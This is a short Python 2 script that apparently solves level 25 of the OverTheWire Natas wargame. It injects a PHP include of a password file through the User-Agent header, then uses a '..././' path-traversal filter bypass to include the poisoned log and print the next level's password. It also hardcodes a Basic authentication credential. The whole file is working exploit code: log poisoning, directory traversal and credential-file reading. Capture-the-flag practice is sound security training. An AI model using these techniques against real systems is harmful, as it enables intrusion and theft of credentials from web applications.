#!/usr/bin/python
import urllib
import urllib2
import binascii


# 
def request_generate(URL, SESSID):
    print SESSID
    req = urllib2.Request(URL)
    req.add_header('User-Agent',  ' <?php include "/etc/natas_webpass/natas26" ?> ')
    req.add_header('Authorization', 'Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==')
    req.add_header('Cookie', '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174; PHPSESSID={};'.format(SESSID))
    return urllib2.urlopen(req)


# main function
def main():
    URL = 'http://natas25.natas.labs.overthewire.org/'
    SESSID = "this_is_our_session"
    request_generate(URL, SESSID)
    return request_generate(URL+"?lang=..././..././..././..././..././var/www/natas/natas25/logs/natas25_{}.log".format(SESSID), SESSID)
    


if __name__=='__main__':
    s=main()
    print s.read()
